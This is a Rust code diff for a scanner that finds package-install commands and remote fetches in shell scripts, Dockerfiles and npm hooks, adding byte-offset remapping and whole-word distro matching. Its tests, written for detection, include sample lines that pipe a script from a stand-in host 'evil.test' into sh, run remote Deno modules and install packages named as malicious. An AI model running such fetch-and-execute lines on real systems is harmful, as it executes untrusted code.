@@ -17,10 +17,10 @@ use filefacts::{Arg, FileType, ParsedFile, RefKind, RefLocator, Reference, Symbo
 /// plus the imperative ones recognized here.
 #[must_use]
 pub fn references(parsed: &ParsedFile<'_>) -> Vec<Reference> {
-    let mut found = Found {
-        refs: parsed.references().to_vec(),
-        text: std::str::from_utf8(parsed.bytes()).ok(),
-    };
+    let mut found = Found::new(
+        parsed.references().to_vec(),
+        std::str::from_utf8(parsed.bytes()).ok(),
+    );
     // Value-driven recognition (npm lifecycle hooks) works from facts alone, so
     // it runs for every file — it no-ops when there is no `npm.scripts` branch.
     npm_scripts(parsed.values().as_json(), &mut found);
@@ -52,10 +52,7 @@ pub fn references(parsed: &ParsedFile<'_>) -> Vec<Reference> {
 /// here — they need the bytes; use [`references`] when those are in hand.
 #[must_use]
 pub fn references_from_facts(values: &serde_json::Value, declared: &[Reference]) -> Vec<Reference> {
-    let mut found = Found {
-        refs: declared.to_vec(),
-        text: None,
-    };
+    let mut found = Found::new(declared.to_vec(), None);
     npm_scripts(values, &mut found);
     dedup(&mut found.refs);
     found.refs
@@ -246,34 +243,92 @@ fn package_key(loc: &RefLocator) -> Option<PackageKey> {
     })
 }
 
+/// Where `part` sits in `text`, when it is a slice of it.
+fn position_in(text: &str, part: &str) -> Option<usize> {
+    let start = part.as_ptr().addr().checked_sub(text.as_ptr().addr())?;
+    (start + part.len() <= text.len()).then_some(start)
+}
+
+/// How positions in a copy of the file's text map back to the file. The copy
+/// runs byte for byte with the file, except where an entry `(copy, file)`
+/// says that from position `copy` on it runs with the file from `file`.
+#[derive(Default)]
+struct Remap(Vec<(usize, usize)>);
+
+impl Remap {
+    /// The file offset of position `copy` in the copy.
+    fn file_offset(&self, copy: usize) -> usize {
+        match self.0.partition_point(|&(c, _)| c <= copy).checked_sub(1) {
+            Some(i) => self.0[i].1 + (copy - self.0[i].0),
+            None => copy,
+        }
+    }
+}
+
+/// How many times one file's text may be searched for a reference's evidence.
+/// Each search can read the whole text, so a cap keeps a file with a huge
+/// number of references from costing time quadratic in its size.
+const EVIDENCE_SEARCHES: usize = 64;
+
 /// Accumulator that carries the file text so each pushed reference gets a
 /// citable byte offset.
 struct Found<'a> {
     refs: Vec<Reference>,
     text: Option<&'a str>,
+    /// Evidence searches left (see [`EVIDENCE_SEARCHES`]).
+    searches: usize,
+    /// The last evidence searched for and where it was found, so the
+    /// packages of one command line share one search.
+    last_search: Option<(String, u64)>,
 }
 
-impl Found<'_> {
-    /// Push an imperative reference (no pin), deriving its offset from the first
-    /// occurrence of `evidence`, else the package-name/URL, else `0`. For a
-    /// recognizer that already knows where it looked, use [`Self::push_at`] —
-    /// searching for an offset already in hand is both slower and less accurate.
+impl<'a> Found<'a> {
+    fn new(refs: Vec<Reference>, text: Option<&'a str>) -> Self {
+        Self {
+            refs,
+            text,
+            searches: EVIDENCE_SEARCHES,
+            last_search: None,
+        }
+    }
+
+    /// Push an imperative reference (no pin) cited by `evidence`. Evidence cut
+    /// from the file's own text is placed where it sits. Evidence from elsewhere
+    /// — an npm hook read from parsed JSON — is searched for: its first
+    /// occurrence, else the package name's or URL's, else `0`, which is also
+    /// where it lands once the file's searches are spent.
     fn push(
         &mut self,
         locator: RefLocator,
         kind: RefKind,
         source: impl Into<String>,
-        evidence: impl Into<String>,
+        evidence: &str,
     ) {
-        let evidence = evidence.into();
-        let offset = self
-            .text
-            .and_then(|t| {
-                t.find(&evidence)
-                    .or_else(|| t.find(&anchor_from_locator(&locator)))
-            })
+        let offset = match self.text.and_then(|t| position_in(t, evidence)) {
+            Some(at) => at as u64,
+            None => self.search(evidence, &locator),
+        };
+        self.push_at(locator, kind, source, evidence.to_string(), offset);
+    }
+
+    /// Where `evidence` (else `locator`'s anchor) first occurs in the text,
+    /// within the file's search allowance.
+    fn search(&mut self, evidence: &str, locator: &RefLocator) -> u64 {
+        if let Some((last, at)) = &self.last_search
+            && last == evidence
+        {
+            return *at;
+        }
+        let Some(text) = self.text.filter(|_| self.searches > 0) else {
+            return 0;
+        };
+        self.searches -= 1;
+        let at = text
+            .find(evidence)
+            .or_else(|| text.find(&anchor_from_locator(locator)))
             .unwrap_or(0) as u64;
-        self.push_at(locator, kind, source, evidence, offset);
+        self.last_search = Some((evidence.to_string(), at));
+        at
     }
 
     /// Push an imperative reference whose byte offset the caller already knows.
@@ -319,7 +374,7 @@ fn npm_scripts(values: &serde_json::Value, out: &mut Found<'_>) {
                 cmd,
             );
         }
-        commands(cmd, &source, out);
+        commands(cmd, None, &source, out);
     }
 }
 
@@ -343,9 +398,11 @@ fn scan_source(text: Option<&str>, source: &str, out: &mut Found<'_>) {
         return;
     };
     let mut normalized = String::with_capacity(text.len());
+    // Braces widen to ` { `, so record where the copy and the file realign.
+    let mut remap = Remap::default();
     let mut quote = None;
     let mut escaped = false;
-    for c in text.chars() {
+    for (at, c) in text.char_indices() {
         if let Some(delimiter) = quote {
             if escaped {
                 normalized.push(c);
@@ -369,13 +426,16 @@ fn scan_source(text: Option<&str>, source: &str, out: &mut Found<'_>) {
             // Keep braces as their own tokens: they bound an options object
             // (`{ "no-save": true }`), and `commands` stops collecting package
             // args at a `{`, so option keys/values are not read as packages.
-            '{' => normalized.push_str(" { "),
-            '}' => normalized.push_str(" } "),
+            '{' | '}' => {
+                remap.0.push((normalized.len() + 1, at));
+                normalized.extend([' ', c, ' ']);
+                remap.0.push((normalized.len(), at + 1));
+            }
             '.' | '(' | ')' | '[' | ']' | ',' | ':' => normalized.push(' '),
             other => normalized.push(other),
         }
     }
-    commands(&normalized, source, out);
+    commands(&normalized, Some(&remap), source, out);
     // git_refs before urls so a `git+https://…` repo is classed Repository, not
     // a plain UrlFetch (dedup keeps whichever recognizer emits the URL first).
     git_refs(text, source, out);
@@ -771,7 +831,7 @@ fn scan_shell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
     let Some(text) = text else {
         return;
     };
-    commands(text, source, out);
+    commands(text, Some(&Remap::default()), source, out);
     git_refs(text, source, out);
     urls(text, source, out);
     bare_fetch_urls(text, source, &[CURL, WGET], out);
@@ -1089,9 +1149,13 @@ fn looks_like_protocolless_url(value: &str) -> bool {
 
 /// Recognize package-manager install commands and emit a [`RefKind::Command`]
 /// per named package. Splits on command separators, joins `\` line
-/// continuations, and matches the invocation anywhere in a segment.
-fn commands(scan: &str, source: &str, out: &mut Found<'_>) {
-    let joined = scan.replace("\\\r\n", " ").replace("\\\n", " ");
+/// continuations, and matches the invocation anywhere in a segment. `remap`
+/// places `scan` in the file when it is (a copy of) the file's text; `None`
+/// for text from elsewhere, which is then searched for.
+fn commands(scan: &str, remap: Option<&Remap>, source: &str, out: &mut Found<'_>) {
+    // Continuations become as many spaces as they had bytes, so a position in
+    // `joined` is the same position in `scan`.
+    let joined = scan.replace("\\\r\n", "   ").replace("\\\n", "  ");
     let dockerfile = source == "dockerfile";
     // A Dockerfile `FROM` sets the stage's base distro, which disambiguates the
     // cross-distro package managers (`apt` → debian/ubuntu, `apk` →
@@ -1126,7 +1190,16 @@ fn commands(scan: &str, source: &str, out: &mut Found<'_>) {
                     break; // a redirect, or an options-object `{`, ends the list
                 }
                 if let Some(locator) = pm_token_locator(eco, arg) {
-                    out.push(locator, RefKind::Command, source, seg);
+                    match remap.zip(position_in(&joined, seg)) {
+                        Some((remap, at)) => out.push_at(
+                            locator,
+                            RefKind::Command,
+                            source,
+                            seg.to_string(),
+                            remap.file_offset(at) as u64,
+                        ),
+                        None => out.push(locator, RefKind::Command, source, seg),
+                    }
                 }
             }
             break; // the rest of the segment is this command's arguments
@@ -1187,7 +1260,12 @@ fn from_image<'a>(after_from: &[&'a str]) -> Option<&'a str> {
 /// image is unrecognized — the manager then falls back to its dominant distro.
 fn image_distro(image: &str) -> Option<&'static str> {
     let img = image.to_ascii_lowercase();
+    // A distro's own name is distinctive anywhere in the reference
+    // (`alpinelinux/build-base`); a release codename or `slim` is an ordinary
+    // word, so it counts only as a whole word of letters (`3.12-slim-bookworm`,
+    // `debian:sid`) — never inside another (`sidekiq`, `focalboard`).
     let has = |n: &str| img.contains(n);
+    let word = |w: &str| img.split(|c: char| !c.is_ascii_lowercase()).any(|t| t == w);
     if has("wolfi") || has("chainguard") {
         Some("wolfi")
     } else if has("alpine") {
@@ -1195,7 +1273,7 @@ fn image_distro(image: &str) -> Option<&'static str> {
     } else if has("ubuntu")
         || ["focal", "jammy", "noble", "mantic", "lunar"]
             .iter()
-            .any(|c| has(c))
+            .any(|c| word(c))
     {
         Some("ubuntu")
     } else if has("opensuse") || has("/suse") || img.starts_with("suse") {
@@ -1205,11 +1283,9 @@ fn image_distro(image: &str) -> Option<&'static str> {
     } else if has("archlinux") || img == "arch" || img.starts_with("arch:") {
         Some("arch")
     } else if has("debian")
-        || [
-            "bookworm", "bullseye", "trixie", "buster", "-slim", "/slim", "sid",
-        ]
-        .iter()
-        .any(|c| has(c))
+        || ["bookworm", "bullseye", "trixie", "buster", "slim", "sid"]
+            .iter()
+            .any(|c| word(c))
     {
         Some("debian")
     } else {
@@ -1662,6 +1738,44 @@ impl<'a> Iterator for UrlScan<'a> {
 mod tests {
     use super::*;
 
+    /// Each reference cites where its evidence sits, found by position rather
+    /// than by searching the file — after a `\` continuation, after braces a
+    /// source scan widened, and on a line whose text also occurs earlier.
+    #[test]
+    fn offsets_cite_the_evidence_where_it_sits() {
+        let cited = |file: &str, text: &str| -> Vec<(String, String)> {
+            references_in_bytes(text.as_bytes(), file)
+                .into_iter()
+                .filter(|r| r.kind == RefKind::Command || r.kind == RefKind::UrlFetch)
+                .map(|r| {
+                    let at = usize::try_from(r.offset).unwrap();
+                    let word = text[at..].split_whitespace().next().unwrap_or("");
+                    (format!("{:?}", r.locator), word.to_string())
+                })
+                .collect()
+        };
+        let shell = "echo start\n\
+                     apt-get install -y \\\n  curl\n\
+                     # npm install left-pad\n\
+                     npm install left-pad\n";
+        assert_eq!(
+            cited("install.sh", shell),
+            [
+                (
+                    r#"Purl("pkg:debian/curl")"#.to_string(),
+                    "apt-get".to_string()
+                ),
+                (r#"Purl("pkg:npm/left-pad")"#.to_string(), "#".to_string()),
+            ],
+            "the comment line names left-pad first, and dedup keeps it"
+        );
+        let js = "const opts = { quiet: true };\n\
+                  require('child_process').execSync('npm install left-pad');\n";
+        let at = cited("setup.js", js);
+        assert_eq!(at.len(), 1, "{at:?}");
+        assert_eq!(at[0].1, "require('child_process').execSync('npm");
+    }
+
     #[test]
     fn a_urls_trailing_text_punctuation_is_not_part_of_it() {
         let text = "curl https://evil.test/a.sh \\\n\
@@ -1699,10 +1813,7 @@ mod tests {
             sudo npm install evil-pkg\n\
             uv pip install requests==2.1 flask\n\
             curl -fsSL https://evil.test/stage2.sh | sh\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls: Vec<_> = out
             .refs
@@ -1976,10 +2087,7 @@ mod tests {
             gem install evilgem\n\
             composer require evil/pkg:^2.0\n\
             apt-get install -y sneakydeb nginx=1.18.0\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls: Vec<&str> = out
             .refs
@@ -2006,6 +2114,26 @@ mod tests {
     }
 
     #[test]
+    fn image_distro_reads_codenames_only_as_whole_words() {
+        for (image, distro) in [
+            ("python:3.12-slim", Some("debian")),
+            ("python:3.12-slim-bookworm", Some("debian")),
+            ("debian:sid", Some("debian")),
+            ("ubuntu:22.04", Some("ubuntu")),
+            ("buildpack-deps:jammy", Some("ubuntu")),
+            ("python:3.12-alpine3.19", Some("alpine")),
+            ("alpinelinux/build-base", Some("alpine")),
+            // Codenames inside other words are not codenames.
+            ("sidekiq:7", None),
+            ("mattermost/focalboard", None),
+            ("lunarvim/lunarvim", None),
+            ("ghcr.io/acme/dustbuster:1", None),
+        ] {
+            assert_eq!(image_distro(image), distro, "{image}");
+        }
+    }
+
+    #[test]
     fn dockerfile_from_context_disambiguates_distro() {
         // Each stage's `FROM` decides whether apt is debian/ubuntu and apk is
         // alpine/wolfi for the `RUN`s beneath it.
@@ -2019,10 +2147,7 @@ mod tests {
             RUN apk add wget\n\
             FROM fedora:40\n\
             RUN dnf install -y httpd\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(df),
-        };
+        let mut out = Found::new(Vec::new(), Some(df));
         scan_shell(out.text, "dockerfile", &mut out);
         let purls = purls_of(&out.refs);
         for want in [
@@ -2051,10 +2176,7 @@ mod tests {
             dart pub add http\n\
             pkg install curl\n\
             pkg_add tmux\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls = purls_of(&out.refs);
         for want in [
@@ -2076,10 +2198,7 @@ mod tests {
     #[test]
     fn pacman_search_is_not_an_install() {
         // `pacman -Ss <term>` is a search; its argument must not become a package.
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some("pacman -Ss firefox\n"),
-        };
+        let mut out = Found::new(Vec::new(), Some("pacman -Ss firefox\n"));
         scan_shell(out.text, "shell", &mut out);
         assert!(purls_of(&out.refs).is_empty(), "{:?}", out.refs);
     }
@@ -2093,10 +2212,7 @@ mod tests {
             apk --no-cache add curl\n\
             dnf -y install httpd\n\
             npm --global install typescript\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls = purls_of(&out.refs);
         for want in [
@@ -2123,10 +2239,7 @@ mod tests {
             bundle add rails\n\
             composer global require phpunit/phpunit\n\
             cargo add serde\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls = purls_of(&out.refs);
         for want in [
@@ -2303,10 +2416,7 @@ mod tests {
             deno run -A npm:@scope/payload\n\
             deno run https://evil.test/mod.ts\n\
             deno run ./local.ts\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls = purls_of(&out.refs);
         assert!(
@@ -2336,10 +2446,7 @@ mod tests {
         let script = "#!/bin/sh\n\
             conda install -y numpy=1.21\n\
             mamba install conda-forge::evilpkg\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls = purls_of(&out.refs);
         assert!(
@@ -2396,10 +2503,7 @@ mod tests {
             npx -y create-evil-app\n\
             pnpm dlx sketchy-tool\n\
             uvx evilcli\n";
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some(script),
-        };
+        let mut out = Found::new(Vec::new(), Some(script));
         scan_shell(out.text, "shell", &mut out);
         let purls = purls_of(&out.refs);
         assert!(
@@ -2685,11 +2789,16 @@ mod tests {
 
     #[test]
     fn flags_files_and_urls_are_not_packages() {
-        let mut out = Found {
-            refs: Vec::new(),
-            text: Some("pip install -r requirements.txt realpkg https://x.test/y.whl"),
-        };
-        commands(out.text.unwrap(), "shell", &mut out);
+        let mut out = Found::new(
+            Vec::new(),
+            Some("pip install -r requirements.txt realpkg https://x.test/y.whl"),
+        );
+        commands(
+            out.text.unwrap(),
+            Some(&Remap::default()),
+            "shell",
+            &mut out,
+        );
         let purls: Vec<_> = out
             .refs
             .iter()
